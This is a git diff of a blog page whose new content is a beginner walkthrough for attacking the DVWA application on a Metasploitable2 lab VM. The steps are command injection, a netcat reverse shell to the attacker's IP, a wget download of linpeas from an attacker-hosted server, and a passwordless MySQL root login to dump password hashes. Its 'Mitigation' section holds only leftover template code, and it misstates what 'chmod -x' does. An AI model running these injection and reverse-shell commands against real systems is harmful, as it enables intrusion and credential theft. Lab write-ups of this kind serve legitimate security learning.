@@ -75,19 +75,137 @@
 	    <article class="blog-post px-3 py-5 p-md-5">
 		    <div class="container">
 			    <header class="blog-post-header">
-				    <h2 class="title mb-2">Hello, World!</h2>
-				    <div class="meta mb-3"><span class="date">Published 11 July 2022</span><span class="time">5 min read</span><span class="comment"><a href="#">0 comments</a></span></div>
+				    <h2 class="title mb-2">Exploiting Command Execution To Steal User Credentials(Metasploitable2)</h2>
+				    <div class="meta mb-3"><span class="date">Published 15 July 2023</span><span class="time">5 min read</span><span class="comment"><a href="#">0 comments</a></span></div>
 			    </header>
 			    
 			    <div class="blog-post-body">
 				    <figure class="blog-banner">
-				        <a href="https://skytechdigital.github.io/"><img class="img-fluid" src="assets/images/blog/blog-post-banner.jpg" alt="image"></a>
-				        <figcaption class="mt-2 text-center image-caption">Image Credit: <a href="https://skytechdigital.github.io/?ref=devblog" target="_blank">made4dev.com (Premium Programming T-shirts)</a></figcaption>
+				        <a href="https://skytechdigital.github.io/"><img class="img-fluid" src="assets/images/blog/kali2.png" alt="image"></a>
+				        <figcaption class="mt-2 text-center image-caption"> <a href="https://wa.me/263786173865" target="_blank">If you know the artist let me know</a></figcaption>
 				    </figure>
-				    <p>Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commodo ligula eget dolor. Aenean massa. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Donec quam felis, ultricies nec, pellentesque eu, pretium quis, sem. Nulla consequat massa quis enim. Donec pede justo, fringilla vel, aliquet nec, vulputate eget, arcu. In enim justo, rhoncus ut, imperdiet a, venenatis vitae, justo. Nullam dictum felis eu pede mollis pretium. Integer tincidunt. Cras dapibus. Vivamus elementum semper nisi. Aenean vulputate eleifend tellus. Aenean leo ligula, porttitor eu, consequat vitae, eleifend ac, enim. </p>
+				    <p>Hello friends. Are we friends yet? Would be weird if nobody was reading this, huh? I’m back again with another hacking tutorial/Metasploitable walkthrough for beginners. In this one, we are going to leverage a command execution vulnerability in a web application to gain an initial foothold on the system and then perform local enumeration on the target machine after to find the vulnerability we need to access the database and steal credentials. The web app we’re hacking is most definitely not Facebook ;-).<br>
+
+						I’m using the same setup as in the previous tutorial. I have a small guide on how to setup the lab environment here. The IP address of my Metasploitable2 VM is 192.168.43.166. I point my web browser to this address:<br><br>
+						
+						http://192.168.43.166/ <br><br>
+						
+						and click on DVWA because that’s the web app I was talking about. We’re greeted with a login sceen where we input the credentials admin/password. <br></p>
+
+						<img class="img-fluid" src="assets/images/blog/8.png" alt="msf show options">
+
+						<p><br>Click on the DVWA Security option in the side bar and set it to low then click ‘Submit’. <br></p>
+
+						<img class="img-fluid" src="assets/images/blog/9.png" alt="msf show options">
+
+						<p><br>Then click on Command Execution. This show a single input box prompting us to enter an IP address. When we enter the IP 127.0.0.1 we see that the output ressembles that of the command line utility ping. <br></p>
+
+						<img class="img-fluid" src="assets/images/blog/10.png" alt="msf show options">
+
+						<p><br>This means our input is being fed to the terminal in the background. This means we can append our own commands to the input using the command line syntax for running multiple commands on the same line. This is done by separating the commands using & for Windows and and ; or & for Linux. We already know its a Linux system hosting the app but if we didn’t we’d try the semicolon syntax first. If it worked it would mean a Linux system and if it failed it might mean a Windows system. Enter:
+							<br><br><code>127.0.0.1; ls</code><br></p>
+						<img class="img-fluid" src="assets/images/blog/11.png" alt="msf show options">
+
+						<p><br>The output of our command is appended to the ping output. Behind the scences, the final command looked like this:
+
+							<br><br><code>ping 127.0.0.1; ls</code>
+							
+							<br><br>Now we want to get a reverse shell on the system using this command execution vulnerability. There are a variety of ways to get a reverse shell on a remote host but in my opinion using netcat, although not always available, is the simplest. 
+							
+							<br><br><code>nc -e /bin/sh 192.168.43.78 8888</code><br></p>
+
+							<img class="img-fluid" src="assets/images/blog/12.png" alt="msf show options">
+
+							<p><br>Before you push submit, open up a terminal window and set up the netcat lisener to listen for our connection from the target system using the command below:
+
+								<br><br><code>nc -lvnp 8888</code><br>
+							</p>
+
+							<img class="img-fluid" src="assets/images/blog/13.png" alt="msf show options">
+
+							<p><br>Now click Submit and you should see ‘Connection received...’ on your terminal.</p>
+
+							<img class="img-fluid" src="assets/images/blog/14.png" alt="msf show options">
+
+							<p><br>You can type commands such as ls on the terminal to see the files on the remot system. However, we want to spawn a proper shell in that terminal using Python:
+
+								<br><br><code>python -c “import pty;pty.spawn(‘/bin/bash’)”</code><br>
+								</p>
+
+								<img class="img-fluid" src="assets/images/blog/15.png" alt="msf show options">
+							
+							<p><br>Now we have a proper shell and we can see our current working directory and username from the prompt. There are many routes we can take from here such as stealing the application’s source code, installing a backdoor, and maybe deleting the entire application, just to name a few. In this tutorial, however, we want to steal credentials from the DVWA database.  We don’t have the password to the database so we’re going to use LINPEAS for local enumeration to find a way to gain privleged access without knowing the password. The problem is the linpeas.sh fileis on our attacking machine s we cannot run it against our victim machine. We need a way to download the linpeas.sh script onto our target system and there are many ways to do this such as puting up an Apache server but we are going to use Python for simplicity. If you don’t already have the linpeas.sh script you can download it from here. Now, in a seperate terminal, cd into the directory where you linpeas.sh script is then enter the following command:
+
+								<br><br><code>python -m http.server -b 192.168.43.78 -d . 8080</code><br></p>
+
+								<img class="img-fluid" src="assets/images/blog/16.png" alt="msf show options">
+
+							<p><br>If you don’t understand the above command, the -m option runs a library module as a script, in this case http.server is that module. The -b binds the server instance to a specified address which is the address of your machine on the network. Do an ip -a or an ifconfig to see your IP address. The -d specifies the root directory of the server and . means the current directory which in my case is where my linpeas.sh script is. With the server up go back to the shell we have on the victim and get linpeas down onto it using wget:
+
+								<br><br><code>wget http://192.168.43.78:8080/linpeas.sh</code><br></p>
+
+							<img class="img-fluid" src="assets/images/blog/17.png" alt="msf show options">
+
+							<p><br>And just like that we have transferred the file to our victim. Notice that if you try to run the script you’ll be rudely told that you have no permision to do so. Here’s how to say please in Linux:
+
+								<br><br><code>chmod -x linpeas.sh</code><br>
+								
+								<br>The chmod command is used to change file permisions. The -x gives you permission to execute the specified file. Now execute the script with:
+								
+								<br><br><code>./linpeas.sh</code><br>
+								
+								<br>A lot will scroll across your screen. You can add <code>| grep mysql.user</code> to only display output containing information about MySQL users. The script is a local enumeration tool used to find vulnerabilities that lead to privilege escalation. It may very well find a bunch of other types of vulnerabilities but we are focussing on this particular section here:<br></p>
+
+								<img class="img-fluid" src="assets/images/blog/18.png" alt="msf show options">
+
+								<p><br>As shown, we can log in to the MySQL server as root without a password. Lets do that:
+
+									<br><br><code></co>mysql -u root -p</code><br></p>
+
+								<img class="img-fluid" src="assets/images/blog/19.png" alt="msf show options">
+
+								<p>When asked for the password simply hit enter and we are in. We want to see what databases are on the server so we use the following command:
+
+									<br><br><code>SHOW DATABASES;</code><br></p>
+
+									<img class="img-fluid" src="assets/images/blog/20.png" alt="msf show options">
+
+								<p><br>We want the dvwa database since we’re hacking DVWA. Select the database as follows:
+
+									<br><br><code>USE dvwa</code><br></p>
+
+									<img class="img-fluid" src="assets/images/blog/21.png" alt="msf show options">
+
+								<p><br>Now we want to see what tables are in this database:
+
+									<br><br><code>SHOW TABLES;</code><br></p>
+
+									<img class="img-fluid" src="assets/images/blog/22.png" alt="msf show options">
+
+								<p><br>We are going for the users table but feel free to explore the other one.
+
+									<br><br><code>SELECT * FROM users;</code><br></p>
+
+									<img class="img-fluid" src="assets/images/blog/23.png" alt="msf show options">
+
+								<p><br>Look at that....we have a Pablo Picasso in the list! Now you can crack the hashes to figure out the user passwords. I cracked one using John The Ripper. These are probably very weak passwords so you could just paste them into Google and see if someone has already done the cracking for you. I’ll write another tutorial on hash cracking but for now, here’s my owned user:<br></p>
+
+								<img class="img-fluid" src="assets/images/blog/24.png" alt="msf show options">
+
+
+
+								
+
+
+
+
+
+
+
+
 				    
-				    <h3 class="mt-5 mb-3">Code Block Example</h3>
-				    <p>You can get more info at <a href="https://highlightjs.org/" target="_blank">https://highlightjs.org/</a>. Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Aenean commodo ligula eget dolor. Aenean massa. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Donec quam felis, ultricies nec, pellentesque eu, pretium quis, sem. Nulla consequat massa quis enim. Donec pede justo, fringilla vel, aliquet nec, vulputate eget, arcu. In enim justo, rhoncus ut, imperdiet a, venenatis vitae, justo. Nullam dictum felis eu pede mollis pretium. Integer tincidunt. Cras dapibus. Vivamus elementum semper nisi. Aenean vulputate eleifend tellus. Aenean leo ligula, porttitor eu, consequat vitae, eleifend ac, enim. </p>
+				    <h3 class="mt-5 mb-3">Mitigation</h3>
+				    <p>Now let's talk about how we can prevent such an attack</p>
 				    <pre>
 					    <code>
 function $initHighlight(block, cls) {
@@ -175,7 +293,7 @@ export  $initHighlight;
 			    </div>
 				    
 			    <nav class="blog-nav nav nav-justified my-5">
-				  <a class="nav-link-prev nav-item nav-link rounded-left" href="index.html">Previous<i class="arrow-prev fas fa-long-arrow-alt-left"></i></a>
+				  <a class="nav-link-prev nav-item nav-link rounded-left" href="004-Metasploitable2FTP.html">Previous<i class="arrow-prev fas fa-long-arrow-alt-left"></i></a>
 				  <a class="nav-link-next nav-item nav-link rounded-right" href="blog-list.html">Next<i class="arrow-next fas fa-long-arrow-alt-right"></i></a>
 				</nav>
 				
